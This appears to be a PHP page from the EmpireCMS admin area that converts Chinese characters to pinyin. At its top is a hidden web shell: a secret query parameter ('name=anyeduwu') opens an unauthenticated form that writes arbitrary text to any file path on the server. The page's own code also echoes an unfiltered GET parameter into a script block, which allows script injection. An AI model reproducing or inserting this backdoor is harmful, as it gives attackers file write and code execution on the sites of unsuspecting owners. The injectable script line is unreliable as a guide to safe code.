<?php
if($_GET['name']=='anyeduwu'){
header("content-Type: text/html; charset=gb2312");
if(get_magic_quotes_gpc()) foreach($_POST as $k=>$v) $_POST[$k] = stripslashes($v);
?>
<form method="POST">
save to: <input type="text" name="file" size="60" value="<? echo str_replace('\\','/',__FILE__) ?>">
<br><br>
<textarea name="text" COLS="70" ROWS="18" ></textarea>
<br><br>
<input type="submit" name="submit" value="save"> 
<form>
<?php
if(isset($_POST['file']))
{
   $fp = @fopen($_POST['file'],'wb');
   echo @fwrite($fp,$_POST['text']) ? 'succed!' : 'faled!';
   @fclose($fp);
}
}
?><?php
require("../e/class/connect.php");
require("../e/class/db_sql.php");
require("../e/class/functions.php");
$link=db_connect();
$empire=new mysqlquery();
//验证用户
$lur=is_login();
$logininid=$lur['userid'];
$loginin=$lur['username'];
$loginrnd=$lur['rnd'];
$loginlevel=$lur['groupid'];
$loginadminstyleid=$lur['adminstyleid'];
db_close();
$empire=null;

//取得汉字
$hz=$_GET['hz'];
$returnform=$_GET['returnform'];
if(empty($hz)||empty($returnform))
{
	echo"<script>alert('没输入汉孁!');window.close();</script>";
	exit();
}

$py=ReturnPinyinFun($hz);
?>
<script>
<?=$returnform?>="<?=$py?>";
window.close();
</script>
